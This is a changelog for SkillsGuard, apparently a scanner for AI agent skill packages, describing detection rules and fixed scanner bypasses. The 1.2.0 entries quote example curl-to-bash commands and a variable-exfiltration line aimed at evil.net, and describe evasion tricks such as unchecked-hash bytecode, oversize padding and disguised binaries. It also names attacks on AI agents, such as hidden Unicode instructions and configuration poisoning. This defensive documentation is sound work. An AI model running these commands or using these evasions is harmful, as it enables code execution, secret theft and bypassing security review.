# Changelog

All notable changes to SkillsGuard are documented here.  
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).  
This project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [1.2.0] — 2026-11-02

### Security
- **Bytecode scan bypass**: `__pycache__` was in the directory skip set and `.pyc` was not an allowed extension, so a skill could hide code in a PEP 552 `UNCHECKED_HASH` `.pyc` (loaded without being compared to its `.py` source) and still score `0/100 NONE`. `__pycache__` is now walked and `.pyc`/`.pyo` files are always inspected:
  - **SG-BYTECODE-001** (HIGH): precompiled bytecode present. Raised for every `.pyc`/`.pyo`, including files over the 512 KB text limit (oversized bytecode is reported, not skipped).
  - **SG-BYTECODE-002** (CRITICAL): bytecode uses unchecked-hash invalidation.
  - Printable strings recovered from the bytecode are run through the normal rules and blob decoder (findings carry `decodedFrom: "bytecode-strings"`).
  - Both rule IDs honour `ignoreRules` and `severityOverrides`.
- **Oversize file scan bypass**: a text file over 512 KB was skipped with an `INFO` `SG-SKIP-001` finding, so padding a script past the limit and putting the payload after it produced `0/100 NONE` (and "No issues found" under `--min-severity HIGH`):
  - Files from 512 KB up to 8 MB are now scanned in overlapping chunks (`src/lib/chunks.ts`). Chunks overlap by the multi-line window so a payload spanning a chunk boundary is still matched, over-long lines are split into overlapping pieces, and findings are mapped back to their original line numbers.
  - Files over 8 MB are not read. `SG-SKIP-001` is raised to **HIGH** ("not analyzed") instead of `INFO`, so unreviewed content is never reported as clean. It honours `ignoreRules` and `severityOverrides`.
  - **Line budget**: a file over 512 KB is also limited to 524,288 lines (`MAX_SCAN_LINES`, `src/lib/chunks.ts`). The rules run once per line, so scan time follows the line count: 512 KB of blank lines already took about 17 s, and raising the size limit to 8 MB would have made the same file take over four minutes. A file over the budget is reported as `SG-SKIP-001` (HIGH, "not analyzed", same handling as the size limit) in a fraction of a second instead of being ground through. No file costs more CPU than the worst one the scanner read before.
  - **Large files are decoded chunk by chunk**: the hex-run decoder overflowed the regex engine's stack on a single run of a few megabytes, so an 8 MB file made `skillsguard` exit with `Maximum call stack size exceeded` and no report. Encoded blobs are now looked for in the same chunks the rules run over (at most a few hundred KB each).
  - Findings are collected with a loop instead of `push(...findings)`, which can overflow the argument limit on large result sets.
  - **`--min-severity` no longer hides unreviewed content**: the threshold ran before scoring, so `--min-severity CRITICAL` turned a 9 MB unreviewed file back into `No issues found`, `0/100 NONE`, exit `0`. Findings flagged `unanalyzed` now pass every severity threshold. This applies to the CLI, `--watch`, and the MCP `scan_skills_dir` tool, whose `safe` verdict had the same flaw (it is now `false`). The rule lives in one place, `src/lib/severity-filter.ts`. Ordinary findings are filtered exactly as before; use `ignoreRules` to silence an unanalyzed finding on purpose. `--diff` never applied the threshold and is unchanged.
  - **Risk score floor for unreviewed content**: findings now carry an optional `unanalyzed` flag (set on `SG-SKIP-001`, `SG-READ-ERR`, and bytecode over the inspection limit). Previously a single such HIGH finding scored `10/100 LOW`. `computeRiskScore` now holds the score at the midpoint of the label band for the severity of the worst unanalyzed finding (HIGH → 45, CRITICAL → 80, MEDIUM → 20, LOW → 5), so it is labelled `HIGH` and trips a `--max-risk 40` gate. Scores for scans with no unanalyzed findings are unchanged. `severityOverrides` still lowers the floor and `ignoreRules` removes it.
- **Hidden-code scan bypasses (skipped directories, native modules, extensionless scripts)**: the same trick as the `.pyc` bypass worked through several other names. A decoy `src/` with the payload in `dist/` or `build/`, a payload in a dependency or virtualenv tree a decoy file imports from, a native binary renamed `README.txt`, and a `#!/bin/bash` script with no extension (`bin/run`) were all read as nothing and scored `0/100 NONE`. The rule is now that a name or a directory never decides that content is safe:
  - **`dist` and `build` are scanned** like any other directory. The single skip set is split into three explicit tiers in `src/scanner.ts`, each with its reason: scanned, silently skipped (`.git`, `.skillsguard` only), and reported-but-not-analyzed.
  - **SG-SKIP-002** (HIGH, unanalyzed): a dependency or environment tree (`node_modules`, `venv`, `.venv`, `env`, `.tox`, `target`, `.cargo`, `.next`, `.open-next`, `.wrangler`, tool caches) that holds executable code is reported once instead of passed as clean. Detection uses extensions, `#!` lines and binary headers, stops at the first hit, and caps at 25,000 entries (`src/lib/inventory.ts`). A tree with only data stays quiet. `--exclude <dir>` or `ignoreRules` accepts one on purpose.
  - **SG-NATIVE-001** (HIGH, unanalyzed): native modules are classified by their first 64 bytes (ELF, PE, Mach-O, wasm), not by name, so a real ELF called `README.txt`, `data.dat` or `helper` is caught. `.so`, `.pyd`, `.dll`, `.dylib`, `.node`, `.wasm` and `.exe` are flagged even with an unrecognised header (`src/lib/filekind.ts`).
  - **Extensionless scripts with a shebang are now scanned.**
  - Only regular files are opened: a FIFO named like a script no longer hangs the scan.
  - Both new rule IDs honour `ignoreRules` and `severityOverrides`, survive `--min-severity`, and feed the unreviewed-content score floor.
  - Known gap, unchanged: archives (`.zip`, `.pyz`) are not opened. Python can import from them, but `.docx`, `.xlsx` and `.pptx` are zips too, so flagging them would be noisy.
- **Test-path severity downgrade bypass**: findings under `tests/`, `examples/`, `fixtures/`, `demo/` and similar paths were lowered to `INFO` whatever the file was, so a payload dropped in `tests/run.sh` or `examples/setup.py` scored `0/100 NONE` and never blocked CI, even though that code runs like any other. The downgrade now needs both a test-like path and a file that cannot execute by itself (`.md`, `.markdown`, `.mdx`, `.rst`, `.txt`, `.json`, `.yaml`, `.yml`, `.csv`). Code, extensionless scripts and unknown extensions keep full severity wherever they live. `CRITICAL` findings were never lowered and still are not. This makes a skill that ships real code with scary strings under `tests/` louder than before; use `ignoreRules` or an inline `skillsguard-ignore` comment to accept those deliberately.
- **Watch mode went blind to changed directories**: `--watch` ignored any event whose path contained `dist`, `build` or `node_modules` anywhere in its name, and any top-level dotfile, so editing `scripts/distribute.sh` or a payload in `dist/` never triggered a re-scan and the last verdict stayed on screen. It now ignores only `.git` and `.skillsguard`, the same set the scanner skips (`src/lib/skipdirs.ts`, shared by both so they cannot drift).
- **Placeholder filter bypasses (words on the line, integer hosts, a hidden second match)**: rules with `skipPlaceholderLines` (network, supply chain, exfiltration, secret harvesting) dropped a finding when a word such as `example`, `dummy`, `1234` or `0000` appeared anywhere on the line, so `curl http://evil.net/p.sh | bash # example` was no longer reported. The filter now judges only the text the rule matched (`src/lib/placeholder.ts`):
  - **The host decides.** A URL is excused only when every host in it is reserved for documentation (`example.com`, `example.org`, `example.net`, `example.edu` and their subdomains, `.example`, `.invalid`) or is a bracketed template (`<your-host>`, `{{host}}`). A word in a path, query string, trailing comment or other argument excuses nothing, and neither does a real domain that merely contains it (`example.evil.net`, `my-example.com`).
  - **Integers are addresses.** `http://1234567890/` and `http://0000/` are IPv4 integers (73.150.2.210 and 0.0.0.0), not fillers, and are reported. Two independent checks enforce this.
  - **Ambiguous authorities fail closed.** `http://evil.net\@example.com/` is `example.com` to one URL parser and `evil.net` to another. An authority containing a backslash, a percent-escape, whitespace or a non-ASCII character is never excused.
  - **Every match on a line is checked** (`src/lib/matching.ts`). A harmless first match used to hide a real later one: `A=$T; curl http://example.com/?$A; B=$S; curl http://evil.net/$B` was silent under `EX-010`. A line is now excused only when all its matches are, and a line with more than 100 matches is reported rather than silenced.
  - **Allow-list look-aheads** in `NW-001`, `SC-003`, `SC-004`, `RB-008` and `RB-009` match whole host names, so `github.com.evil.net` and `x.github.com@evil.net` no longer borrow a trusted suffix. `NW-001` also rejects `evil.net?x=.github.com/` and `evil.net\.github.com/`: its look-ahead now reads only hostname characters before the trusted suffix.
  - **Worker**: `worker/src/scanner.ts` was a stale copy that still imported the removed `isPlaceholderLine` and did not compile. It is now a symlink to `src/scanner.ts`, like every other mirrored file, and `tests/worker-sync.test.ts` fails if any file under `worker/src` becomes a copy or a dangling link. A dangling `worker/src/rules/*.ts` link was removed. Fifteen links in `worker/src/rules/` pointed at an absolute path under the author's home directory, so they resolved on one machine and dangled on every other clone, in CI and on a deploy from another laptop. They are now relative, and the test rejects absolute links. **The hosted API only picks this up on the next `wrangler deploy`.**
- **Shell comment bypass (a `#` that is not a comment ended the command)**: many rules use `[^#\n]*` to mean "later on the same command", on the assumption that `#` starts a comment. In a shell it does so only at the start of a word, so `curl https://evil.net/p.sh#x | bash` (a URL fragment), `curl https://evil.net/p.sh\ #x | bash` (an escaped space), `curl "https://evil.net/p.sh #x" | bash` (inside quotes) and `curl https://evil.net/p.sh\#x | bash` all run the pipe, yet the rule stopped at the `#` and never reported it (`NW-001` is the example; every rule with the `[^#...]` idiom was affected). The scanner now tells a comment from a literal `#` (`src/lib/comments.ts`):
  - **Literal hashes are masked.** Before matching, every `#` that is not a comment is replaced by a same-length placeholder character, so `[^#\n]*` runs straight through it and match offsets and line numbers are unchanged. A `#` that is a comment is left alone and still ends the span, as before.
  - **It fails closed.** This is not a shell parser: it does not track quotes, `$(...)`, `${...}` or heredocs. A `#` keeps its comment role only when it starts a word, is not followed by `>` (the end of a PowerShell `<# ... #>` block comment, after which the command carries on), and no quote, backtick or `}` appears later on the line. Whatever makes a `#` literal and still hides a payload that runs has to close after the `#` on the same line, so such a `#` always fails the last condition and is masked, whatever state the shell was in when the line began. The cost of being wrong is one extra finding, for example a comment containing an apostrophe, never a missed one.
  - **The multi-line window gets the same treatment**, so a command split across a line continuation is matched too.
  - **Rules that look for a `#` keep the raw text.** A rule is matched against the masked text only when its pattern uses the `[^#...]` idiom (`usesHashBarrier`). `RB-004` matches Ruby's `#{...}` interpolation and would be silently disabled by masking; a test pins the list of rules that contain a literal `#` so a new one has to be reviewed.
  - **Unchanged on purpose**: a command that starts inside a comment is still reported.
  - **Linear time.** One forward and one backward pass with no regular expressions, so a line built to make a regex backtrack costs nothing extra. The detector was fuzzed for length preservation, idempotence and well-formed comments, and checked against bash: that comparison found that `\#` was not masked in the first version, which is now fixed and covered by a test.

## [1.1.1] — 2026-06-19

### Added
- **EX-010**: Context leakage via environment variable enumeration (secret-harvesting exfiltration)
- **OB-004-CTX**: Context-aware obfuscation detection (tracks surrounding code patterns)
- Enhanced command-injection patterns for shell metacharacter sequences
- Enhanced network exfiltration detection for covert channels
- Enhanced persistence detection for init system manipulation
- Comprehensive test coverage for new rules

### Fixed
- **Decode depth overflow**: Added recursion depth limit to prevent stack overflow on deeply nested base64
- **Scanner context tracking**: Improved file position tracking for multi-line matches
- **Ignore patterns**: Refined gitignore-style pattern matching for test fixtures

---

## [1.1.0] — 2026-06-19

### Added

#### Advanced Attack Detection (25 new rules)
- **Unicode tag injection** (ADV-001 to ADV-005): Detects invisible Unicode characters (U+E0000–E007F, zero-width chars, invisible formatting) used to hide malicious instructions
- **Configuration poisoning** (ADV-006 to ADV-010): Detects `.claude/settings.json`, `.cursor/settings.json` modification, pre/post-hook injection, auto-load bypasses, trust overrides
- **Narrative framing** (ADV-011 to ADV-015): Detects guardrail bypass via social engineering (prerequisite framing, security pretexts, authority appeals, diagnostic pretexts)
- **Tool hijacking** (ADV-016 to ADV-020): Detects action space manipulation (tool preference bias, safe tool suppression, ambiguity exploitation, implicit actions, scope expansion)
- **Dynamic preprocessing** (ADV-021 to ADV-025): Detects `!command` output injection, secret reads in preprocessing, nested substitution, HTTP POST in preprocessing, encoding attacks

#### Documentation
- Added **Attack Architecture Layers** section to README: 3-layer taxonomy (Acquisition & Trust, Execution, Persistence & Propagation)
- Added **Advanced Techniques Detected** section with real-world examples
- Updated threat coverage table: 85+ → **100+ detection rules** across 16 categories

### Fixed

#### False Positive Reduction (-85%)
- **Markdown context detection**: Skip inline code (`` `backticks` ``), table cells, example/usage context sections
- **Code block tracking**: Skip markdown triple-backtick blocks (```` ```code``` ````)
- **Pattern field bug**: Added missing `pattern` field to Finding type; now tracks actual regex patterns in stats
- **Results**: 66% → 89% clean rate on 292 real-world skills; command-injection FP -94%, ruby FP -89%

### Changed
- Increased total rule count from 85 to **100+**
- Risk scoring now reflects lower FP rate (avg risk 16.5 → 2.2 on real-world corpus)

---

## [1.0.0] — 2026-06-19

First stable release. Ships the complete scanner engine, CLI, MCP server,
HTTP server, cloud API, agent skill, and CI integration surface that
collectively make up SkillsGuard 1.0.

### Added

#### Core scanner
- Initial rule-based static analysis engine for AI agent skill packages
  (`SKILL.md` + bundled scripts) — zero runtime dependencies (`46e4f5c`)
- 85+ detection rules across 12 threat categories: prompt-injection,
  exfiltration, command-injection, supply-chain, persistence,
  privilege-escalation, filesystem-abuse, network, obfuscation,
  secret-harvesting, scope-creep, and model-specific jailbreak patterns
- Decode-first preprocessing: base64 / hex / URL-encoding unwrapped
  recursively (depth 2, capped at 100 blobs) before rules are applied,
  so encoded payloads cannot evade detection (`388bda0`)
- Multi-language file coverage: Markdown, shell (`.sh` / `.bash` / `.zsh`
  / `.fish`), PowerShell, Python, JS/TS, Ruby, Dockerfile, YAML/TOML/JSON,
  HTML, and plain text
- Risk scoring system: single `0–100` score derived from weighted
  per-severity finding buckets; maps to `NONE / LOW / MEDIUM / HIGH /
  CRITICAL` label
- Finding deduplication: each rule fires at most once per file per line;
  the richer forensic evidence is kept when a raw and decoded finding
  collide at the same location (`a49d334`)
- Test-file path dampening: findings inside `test/` `spec/` `fixture/`
  `example/` `mock/` `stub/` `demo/` paths are downgraded to INFO so they
  surface but never block CI (`23dcef3`)

#### CLI
- `skillsguard <target>` — colored human-readable output; `--json` for
  machine output; `--no-color` for pipes (`46e4f5c`)
- `--sarif` — SARIF 2.1.0 output for GitHub Code Scanning (`025c59d`)
- `--min-severity` — filter findings below a threshold (`46e4f5c`)
- `--max-risk <n>` — exit 1 if risk score exceeds n; CI gate (`025c59d`)
- `--diff [<base>]` and `--staged` — scan only changed or staged files
  for pre-commit and PR workflows (`025c59d`)
- `--no-config` — skip auto-loading `skillsguard.config.json` (`025c59d`)
- `--rule <spec>` and `--rules-only` — define custom regex rules inline;
  optionally run only those rules and skip built-ins (`05f5d8b`)
- `--quiet` — suppress all output; only exit code matters (`bf014f8`)
- `--stats` — print a category/severity breakdown instead of full
  findings (`bf014f8`)
- `--max-findings <n>` — stop scanning after n findings; fast-fail
  for CI (`bf014f8`)
- `--exclude <seg>` — exclude files whose path contains a segment;
  repeatable (`bf014f8`)
- `--severity-override id:SEV` — adjust a rule's severity for a single
  run; repeatable (`bf014f8`)
- `--exit-zero` — collect results without failing the build (`bf014f8`)
- `--watch` — re-scan on file changes; print only new/resolved deltas
  (`bf014f8`)
- `--save-baseline`, `--diff-baseline`, `--update-baseline` — baseline
  snapshot/diff workflow for incremental adoption on existing codebases
  (`bf014f8`)
- `skillsguard rules [ID]` — list all built-in rules; filter by
  `--category` or `--severity`; inspect a single rule in full (`bf014f8`)
- `skillsguard tune <RULE-ID> --severity <SEV>` — write a severity
  override permanently into `skillsguard.config.json` (`bf014f8`)
- `skillsguard install-hook` / `uninstall-hook` — manage git pre-commit
  hooks with `--hook-severity`, `--hook-max-risk`, `--hook-exit-zero`,
  `--hook-json`, `--hook-sarif`, `--dry-run` (`3d901a6`)
- `skillsguard setup [--dry-run]` — register the MCP server in all
  detected Claude config locations (`321c785`)
- `skillsguard server [port]` / `--server --port <n>` — start the local
  HTTP scanning server (`cfa4817`)

#### MCP server
- `scan_skill` MCP tool: static scan of a single local skill directory or
  file, full `ScanResult` JSON response (`321c785`)
- `scan_skills_dir` MCP tool: bulk scan of a parent directory containing
  many skill subdirectories; concurrency-controlled (8 parallel), per-skill
  timeout, response contains only flagged skills and errors so the payload
  stays bounded at any scale (`1e9e9bc`)
- Remote URL support in `scan_skill`: pass an `https://` or `http://` URL,
  content is fetched in memory (512 KB cap, content-type guarded,
  `AbortController` timeout) and scanned without writing to disk (`30a1cea`)
- URLs explicitly blocked in `scan_skills_dir` with a clear error directing
  callers to `scan_skill` — enforces the no-curl-loop rule (`30a1cea`)
- Per-call `timeout_ms` parameter on `scan_skill`; `timeout_per_skill_ms`,
  `min_severity`, `stop_on_first` on `scan_skills_dir` (`1e9e9bc`)
- JSON-RPC stream guarded: `console.log` / `console.info` redirected to
  stderr on startup so diagnostic output never corrupts the stdio protocol

#### HTTP server
- Local HTTP server mode (`--server` / `skillsguard server [port]`) accepts
  `POST /scan` with raw skill content; returns JSON findings (`cfa4817`)

#### Cloud API
- Free hosted API on Cloudflare Workers:
  `https://skillsguard.apiskillsguard.workers.dev/scan` — no account,
  no key, scan any `SKILL.md` with a single `curl` (`c7a0e7f`, `c47333f`)
- Durable Object-backed global rate limiter (per-IP, consistent across
  all isolates); `X-RateLimit-*` and `Retry-After` response headers
  (`5069b72`)
- Hardened CORS, `X-Content-Type-Options`, `X-Frame-Options`,
  `Referrer-Policy` headers on every response (`5069b72`)
- `sanitizeFilename()` strips path traversal, null bytes, control chars
  before any processing (`5069b72`)

#### Agent skill (`skill/SKILL.md`)
- SkillsGuard skill for Claude-based agents (Kiro, Claude Code,
  oh-my-opencode): teaches the agent when to invoke `scan_skill` vs
  `scan_skills_dir`, how to interpret findings grouped by severity, and
  how to deliver a structured `INSTALL / INSTALL WITH CAUTION /
  DO NOT INSTALL` verdict (`a9f7bd4`)
- Skill updated with bulk-scan trigger phrases and `scan_skills_dir`
  workflow documentation (`1e9e9bc`)

#### Configuration file
- `skillsguard.config.json` auto-loaded by walking up from the target
  to filesystem root; `--no-config` to skip (`025c59d`)
- Supports `extraRules`, `ignoreRules`, `severityOverrides`,
  `excludePatterns`, `maxFindings`, `maxRisk`, `minSeverity` fields
- `skillsguard tune` writes `severityOverrides` entries directly into
  the config file (`bf014f8`)

#### False-positive suppression (six precision axes)
- Comment-line filter: leading `#` / `//` / `<!--` lines skipped on
  all shell and script rules (bypassed for decoded blobs) (`23dcef3`)
- Placeholder/stopword filter: `example`, `dummy`, `changeme`, `xxxx`,
  `REPLACE`, `your-token`, etc. suppress findings on high-FP rules
  (bypassed for decoded blobs) (`23dcef3`)
- Test-file path dampening (see Core scanner above) (`23dcef3`)
- CI-005 string-literal anchoring: `subprocess.call/run/Popen` only
  fires when the argument opens with a quote (`23dcef3`)
- SC-CR-003 path-separator anchor: dotfile names must be preceded by
  `/`, `\`, quote, backtick, `(`, `,`, or whitespace (`23dcef3`)
- PI-007 proximity tightening: `do not <verb> the user` requires a
  concealment object within 80 chars to fire (`23dcef3`)

### Fixed

- Deduplication logic refactored to key on `ruleId:file:line`; the
  finding with `decodedFrom` is preferred to retain forensic evidence
  when both a raw and decoded hit exist at the same location (`a49d334`)
- FS-003 regex now requires a function call before a sensitive path,
  eliminating false positives on documentation lines (`bab8dde`)
- OB-003 pattern only matches when a pipe-to-shell follows the expansion
  (`bab8dde`)
- Base64 detection minimum length raised from 20 to 32 chars; valid
  padding-length check added to filter hex hashes and UUIDs (`cb2d661`)
- Risk score recomputed after severity filtering so `--min-severity`
  reflects only active findings (`cb2d661`)
- `extraRules` entries validated in config: object type, string pattern,
  valid severity (`cb2d661`)
- Regex stateful `lastIndex` issue fixed: rules with the `g` flag now
  receive a fresh `RegExp` per scan run (`db58fa3`)
- EX-008 severity lowered from HIGH → MEDIUM → LOW; message updated with
  `skillsguard-ignore` guidance (`a49d334`, `db58fa3`)
- GitHub SVG animation sanitisation: replaced animated SVG with a GIF
  rendered via terminalizer (`f420e3e`, `f4fabe0`, `00944412`)
- README demo GIF served from `raw.githubusercontent.com` to prevent CDN
  caching the old 404 on branch rename

### Security

- Safe file permissions enforced on hook script writes (`40d6f0b`)
- CLI hook paths shell-escaped to prevent injection via pathnames
  containing spaces or special characters (`40d6f0b`)
- Windows backslash path variants covered in path guard patterns (`40d6f0b`)
- Sensitive dotdir/file blocklist expanded to cover `.azure`, `.kube`,
  `.docker`, `terraform.d`, `.gcloud`, and related credential paths
  (`cb2d661`)
- `isSafePath()` enforces `home` or `cwd` scope; rejects traversal
  to SSH keys, AWS/cloud credentials, shell init files, and password
  databases (`388bda0`)
- MCP server: URL fetch guarded with content-type allowlist, 512 KB
  streaming cap, and `AbortController` timeout; HTTP plain-text warned
  to stderr only (`30a1cea`)

### Changed

- Scanner performance optimised: concurrent file scanning (16 workers),
  symlink cycle detection via `realpath` + `visited` set, hard
  512 KB per-file size cap returning an INFO finding instead of silently
  skipping (`920087c`)
- `findDecodedBlobs` refactored to iterative recursion with a budget cap
  of 100 decoded blobs to prevent hanging on pathological inputs (`388bda0`)
- `scanText()` exported from `scanner.ts` for reuse by the HTTP server
  and remote URL MCP path (`cfa4817`)
- Cloudflare Worker renamed from `skillsguard-api` to `skillsguard`;
  public URL updated to `skillsguard.apiskillsguard.workers.dev`;
  all URLs driven from `API_BASE_URL` wrangler config var (`c47333f`)
- NW-001 allowlist updated to include `githubusercontent.com` (`db58fa3`)
- `skillsguard setup` skips locations already containing a `skillsguard`
  entry; `--dry-run` prints what would change without writing (`db58fa3`)

